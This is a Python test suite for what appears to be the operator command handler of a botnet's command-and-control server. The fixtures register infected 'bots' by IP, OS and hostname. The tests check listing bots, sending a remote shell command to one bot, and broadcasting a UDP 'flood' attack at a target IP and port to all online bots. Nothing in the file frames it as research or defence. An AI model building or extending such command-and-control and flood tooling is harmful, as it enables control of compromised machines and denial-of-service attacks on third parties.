"""Tests for CLICommandHandler"""

import pytest
from server.cli_handler import CLICommandHandler
from server.db import Database
from server.commands import CommandQueue


@pytest.fixture
async def sample_db(db: Database):
    """Pre-populate database with sample bots"""
    await db.add_bot(
        bot_id="test_a1b2",
        ip="10.0.0.1",
        port=12345,
        os_name="Linux",
        os_version="Ubuntu 22.04",
        arch="x86_64",
        kernel="5.15.0",
        hostname="test-pc",
    )
    await db.add_bot(
        bot_id="test_c3d4",
        ip="10.0.0.2",
        port=12346,
        os_name="Linux",
        os_version="Debian 11",
        arch="aarch64",
        kernel="5.10.0",
        hostname="raspberry",
    )
    return db


@pytest.fixture
def handler(sample_db: Database, cmd_queue: CommandQueue):
    return CLICommandHandler(sample_db, cmd_queue)


@pytest.mark.asyncio
async def test_bots_list(handler, sample_db):
    resp = await handler.handle_action("bots_list", {})
    assert resp["ok"] is True
    assert len(resp["data"]) == 2


@pytest.mark.asyncio
async def test_bots_list_empty(db, cmd_queue):
    handler = CLICommandHandler(db, cmd_queue)
    resp = await handler.handle_action("bots_list", {})
    assert resp["ok"] is True
    assert resp["data"] == []


@pytest.mark.asyncio
async def test_bots_count(handler):
    resp = await handler.handle_action("bots_count", {})
    assert resp["ok"] is True
    assert resp["data"]["total"] == 2
    assert resp["data"]["online"] == 2
    assert resp["data"]["offline"] == 0


@pytest.mark.asyncio
async def test_bot_info_by_bot_id(handler):
    resp = await handler.handle_action("bot_info", {"bot_id": "test_a1b2"})
    assert resp["ok"] is True
    assert resp["data"]["hostname"] == "test-pc"
    assert resp["data"]["arch"] == "x86_64"


@pytest.mark.asyncio
async def test_bot_info_by_db_id(handler):
    resp = await handler.handle_action("bot_info", {"bot_id": "1"})
    assert resp["ok"] is True
    assert resp["data"]["hostname"] == "test-pc"


@pytest.mark.asyncio
async def test_bot_info_nonexistent(handler):
    resp = await handler.handle_action("bot_info", {"bot_id": "nonexistent"})
    assert resp["ok"] is False
    assert "not found" in resp["error"]


@pytest.mark.asyncio
async def test_cmd_send(handler, cmd_queue):
    resp = await handler.handle_action(
        "cmd_send", {"bot_id": "test_a1b2", "module": "shell", "params": {"cmd": "id"}}
    )
    assert resp["ok"] is True
    assert len(resp["cmd_id"]) > 0
    cmd = cmd_queue.dequeue("test_a1b2")
    assert cmd is not None
    assert cmd.module == "shell"
    assert cmd.params == {"cmd": "id"}


@pytest.mark.asyncio
async def test_cmd_broadcast(handler, cmd_queue):
    resp = await handler.handle_action(
        "cmd_broadcast", {"module": "flood", "params": {"type": "udp", "target": "10.0.0.5", "port": "80"}}
    )
    assert resp["ok"] is True
    assert resp["sent_to"] == 2
    assert len(resp["bot_ids"]) == 2


@pytest.mark.asyncio
async def test_cmd_broadcast_no_online(db, cmd_queue):
    handler = CLICommandHandler(db, cmd_queue)
    resp = await handler.handle_action(
        "cmd_broadcast", {"module": "flood", "params": {}}
    )
    assert resp["ok"] is True
    assert resp["sent_to"] == 0


@pytest.mark.asyncio
async def test_cmd_status_found(handler, sample_db):
    await sample_db.add_command("cmd001", "test_a1b2", "shell", '{"cmd":"id"}')
    resp = await handler.handle_action("cmd_status", {"cmd_id": "cmd001"})
    assert resp["ok"] is True
    assert resp["data"]["module"] == "shell"


@pytest.mark.asyncio
async def test_cmd_status_not_found(handler):
    resp = await handler.handle_action("cmd_status", {"cmd_id": "nonexistent"})
    assert resp["ok"] is False
    assert "not found" in resp["error"]


@pytest.mark.asyncio
async def test_ping(handler):
    resp = await handler.handle_action("ping", {})
    assert resp["ok"] is True


@pytest.mark.asyncio
async def test_unknown_action(handler):
    resp = await handler.handle_action("invalid_action", {})
    assert resp["ok"] is False
    assert "Unknown action" in resp["error"]
